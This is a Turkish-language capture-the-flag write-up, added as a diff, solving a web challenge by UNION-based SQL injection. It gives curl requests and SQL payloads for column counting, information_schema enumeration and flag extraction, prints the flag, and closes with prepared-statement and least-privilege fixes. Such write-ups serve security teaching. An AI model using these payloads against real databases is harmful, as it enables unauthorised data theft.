@@ -1,0 +1,118 @@
+Union - Web Challenge
+Açıklama
+UNION-based SQL Injection kullanarak veritabanından flag'i çekmek. Challenge, information_schema üzerinden tablo/sütun enumerasyonu ve UNION SELECT tekniklerini gösteriyor.
+
+Çözüm
+İlk keşif yapıldı:
+bash
+curl "http://64.226.74.243:10004/?id=1"
+GET parametresi: id
+Çıktı: Ürün adı ve fiyat
+İpucu: "Data is just data"
+Farklı ID'ler test edildi:
+bash
+curl "http://64.226.74.243:10004/?id=2"
+curl "http://64.226.74.243:10004/?id=3"
+id=1 → Book, Price: 10
+id=2 → Pen, Price: 2
+id=3 → Notebook, Price: 5
+SQL Injection zafiyeti test edildi:
+bash
+curl "http://64.226.74.243:10004/?id=1'"
+SQL hatası alındı → Zafiyet var!
+Sütun sayısı ORDER BY ile keşfedildi:
+bash
+curl "http://64.226.74.243:10004/?id=1+ORDER+BY+1"  # ✅
+curl "http://64.226.74.243:10004/?id=1+ORDER+BY+2"  # ✅
+curl "http://64.226.74.243:10004/?id=1+ORDER+BY+3"  # ❌ HATA
+Sonuç: 2 sütun
+UNION SELECT ile veri çekme test edildi:
+bash
+curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+1,2"
+Name: 1, Price: 2 → Başarılı!
+sütun: Name alanında
+sütun: Price alanında
+Database bilgisi çekildi:
+bash
+curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+database(),version()"
+Database: hard_db
+Version: MySQL 8.0.45
+Tablo isimleri listelendi:
+bash
+curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables+WHERE+table_schema=database()"
+Tablolar: flags, products
+Sütun isimleri listelendi:
+bash
+curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_schema=database()"
+flags tablosu: id, flag
+products tablosu: id, name, price
+Flag çekildi:
+bash
+curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+flag,NULL+FROM+flags"
+Flag
+FLAG{union_select_seni_bekliyordu324435876485}
+
+Öğrenilenler
+UNION-based SQL Injection
+ORDER BY ile sütun sayısı keşfi
+information_schema kullanımı
+Tablo ve sütun enumerasyonu
+Numeric SQL Injection (tırnak gerektirmeden)
+NULL padding teknikleri
+Database fingerprinting
+UNION SELECT şartları (sütun sayısı ve veri tipi uyumu)
+Kullanılan Araçlar
+curl - HTTP client
+Terminal
+Zorluk
+⭐ Orta seviye
+
+Notlar
+Challenge, klasik UNION-based SQL Injection tekniklerini gösteriyor. Güvensiz kod: SELECT name, price FROM products WHERE id = $id - numeric parametre olduğu için tırnak koruması yok ama prepared statement kullanılmamış. UNION injection için 2 kritik şart: (1) sütun sayısı eşit olmalı, (2) veri tipleri uyumlu olmalı.
+
+Exploit Akışı:
+
+sql
+-- 1. Sütun sayısı keşfi
+SELECT name, price FROM products WHERE id = 1 ORDER BY 2  -- ✅
+SELECT name, price FROM products WHERE id = 1 ORDER BY 3  -- ❌
+
+-- 2. UNION test
+SELECT name, price FROM products WHERE id = -1 UNION SELECT 1,2
+-- Output: Name: 1, Price: 2
+
+-- 3. Database enumeration
+SELECT name, price FROM products WHERE id = -1 
+UNION SELECT table_name, table_schema 
+FROM information_schema.tables 
+WHERE table_schema=database()
+-- Output: flags, products
+
+-- 4. Column enumeration
+SELECT name, price FROM products WHERE id = -1 
+UNION SELECT column_name, table_name 
+FROM information_schema.columns 
+WHERE table_schema=database()
+-- Output: id, flag (flags tablosunda)
+
+-- 5. Flag extraction
+SELECT name, price FROM products WHERE id = -1 
+UNION SELECT flag, NULL FROM flags
+-- Output: FLAG{union_select_seni_bekliyordu324435876485}
+UNION Injection Şartları:
+
+Sütun sayısı eşit olmalı (orijinal: 2, union: 2)
+Veri tipleri uyumlu olmalı (string/string, numeric/NULL)
+-1 kullanarak orijinal sonuçları gizledik
+Güvenlik Önlemleri:
+
+php
+// Prepared statements kullan
+$stmt = $mysqli->prepare("SELECT name, price FROM products WHERE id = ?");
+$stmt->bind_param("i", $id);
+
+// Input validation
+if (!is_numeric($id) || $id < 1) die("Invalid ID");
+
+// Least privilege (sadece SELECT yetkisi)
+GRANT SELECT ON hard_db.products TO 'web_user'@'localhost';
